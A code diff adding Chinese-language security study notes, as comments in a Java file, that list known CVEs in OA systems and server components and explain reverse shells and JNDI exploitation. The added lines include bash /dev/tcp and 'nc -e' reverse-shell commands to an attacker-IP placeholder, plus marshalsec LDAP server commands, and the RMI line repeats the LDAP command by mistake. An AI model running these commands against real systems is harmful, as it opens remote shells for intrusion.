@@ -51,48 +51,101 @@ public class Summary1 {
      * ======================================================
      * 应用场景：
      * OA系统、CMS系统、热门框架、中间件
-     *
+     * 泛微、用友、网康、蓝凌、通达、锐捷
+     * 泛微
+     * 泛微云桥 任意文件读取
+     * 泛微OA V8 前台Sql注入
+     * 泛微OA WorkflowServiceXml RCE CNVD-2019-32204
+     * 泛微OA weaver.common.Ctrl 任意文件上传
+     * 泛微OA Bsh RCE
+     * 泛微OA WorkflowCenterTreeData接口SQL注入(仅限oracle数据库) CNVD-2019-34241
+     * 泛微OA E-Cology 数据库配置信息泄漏
      *
      * ==================================================
      * 组件漏洞
      * redis
      *  指令安全、端口安全、Lua脚本安全、SSL代理
+     * Redis RCE复现及简单分析（CVE-2022-0543）
      *
      * es
+     * Elasticsearch-Kibana （CVE-2018-17246）
      *
-     * tomcat
-     * 任意文件上传
-     * 文件读取和包含
-     * 反序列化
+     * dubbo
+     * Apache Dubbo Provider默认反序列漏洞（CVE-2020-1948）
+     *
+     * sharding
+     * CVE-2020-1947：ShardingSphere RCE
+     *
      *
      * jboss
-     * 反序列化
+     * 代码执行 (CVE-2017-12149)
+     * JBossMQJMS 反序列化漏洞（CVE-2017-7504）
+     * JBoss JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）
      *
-     * weblogic
-     * 反序列化
      *
      * ssrf
      * 任意文件读取、文件上传
      * 远程代码执行
      *
      *
-     * nginx
-     * 文件解析：
-     * 目录遍历
-     *
-     *
      * docker
      *  docker逃逸 Docker版本 < 18.09.2，runC版本< 1.0-rc6。
      *
-     * spring
-     * xxe
-     * springboot
+     *
      * springcloud
+     * Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）
+     *
+     * struts
+     * Struts2 S2-045远程代码执行漏洞（CVE-2017-5638）
+     * Struts2 S2-061远程代码执行漏洞（CVE-2020-17530）
+     * Struts2 S2-059 远程代码执行 CVE-2019-0230：
      *
      * Hadoop
+     * Spring-data-commons(CVE-2018-1273)
+     *
+     * spark
+     * Apache Spark远程命令执行漏洞
+     *
+     * sqlserver
+     * CVE-2020-0618：SQL Server 远程代码执行
+     *
+     * tomcat
+     * Tomcat任意文件写入漏洞（CVE-2017-12615）
+     * Tomcat Session 反序列化 CVE-2020-9484
+     * CVE-2020-1938：Apache Tomcat文件包含
+     *
+     * django
+     * CVE-2020-7471：Django SQL注入漏洞
+     *
+     * freemarker
+     * CVE-2020-7799：FreeMarker模板FusionAuth RCE
+     *
+     * nginx
+     * Nginx 拒绝服务漏洞(CVE-2019-9513、CVE-2019-9511)
+     *
+     * solr
+     * Apache Solr远程代码执行漏洞（CVE-2019-12409)
+     *Tomcat AJP本地文件包含漏洞（CNVD-2020-10487）
+     * Tomcat WebSocket拒绝服务漏洞（CVE-2020-13935）
+     * Apache Solr JMX服务 RCE 漏洞
+     *
+     * weblogic
+     * WebLogic后台命令执行漏洞（CVE-2021-2109）
+     * Weblogic前台验证绕过+后台命令执行漏洞复现（CVE-2020-14882、CVE-2020-14883）
+     * Weblogic前台验证绕过漏洞复现（CVE-2020-14750）
+     * WebLogic任意文件上传漏洞(CVE-2019-2618)
+     * CVE-2020-14825：Weblogic反序列化漏洞
+     *
+     *
+     * shiro
+     * CVE-2020-11989：Apache Shiro权限绕过
+     *
+     * openssh
+     * CVE-2020-15778：OpenSSH命令注入漏洞
      *
      *
      *  邮件安全
+     *  CVE-2022-20798
      *  邮件病毒、邮件炸弹、密码问题、钓鱼邮件
      *  命令注入：POP3和SMTP 两个都是使用时候对用户输入的参数没有过滤 建议白名单过滤
      *
@@ -118,6 +171,29 @@ public class Summary1 {
      * 2 查找可控变量 正向追踪变量传递过程
      * 3 寻找敏感功能点 通读功能点代码
      * 4 直接通读全文代码
+     *
+     * ==============================================================
+     * 反弹shell
+     * 为什么要反弹shell
+     * 用户是在局域网里 不好直接连接，就让用户主动连接攻击者 连接上之后 就可以给他发请求了 例如ls什么的
+     * 怎么反弹
+     * 攻击者打开端口等待连接：nc -lvp 4444
+     * 被攻击者运行反弹命令（被攻击者怎么运行 其实就是在该服务器网站上找个输入的入口 写入命令就好了）：bash -i >& /dev/tcp/攻击者IP/4444 0>&1
+     * （nc反弹：nc -e /bin/bash 攻击者IP 4444）还可以telnet反弹
+     * 然后被攻击者就与攻击者连上了
+     * 攻击者就可以给对方服务器发请求了
+     *
+     * 开启LDAP服务
+     * 1389 指LDAP服务的端口
+     * java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/#ExportObject 1389
+     *
+     * 开启RMI服务
+     * 1099 指RMI服务的端口
+     * java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/#ExportObject 1389
+     *
+     *
+     * CRLF是回车+换行（\r\n）的简称 十六进制编码分别为0x0d和0x0a
+     * Http header与http body是用两个CRLF分割的 浏览器就是根据这两个CRLF来取出HTTP内容并显示出来
      *
      *
      *
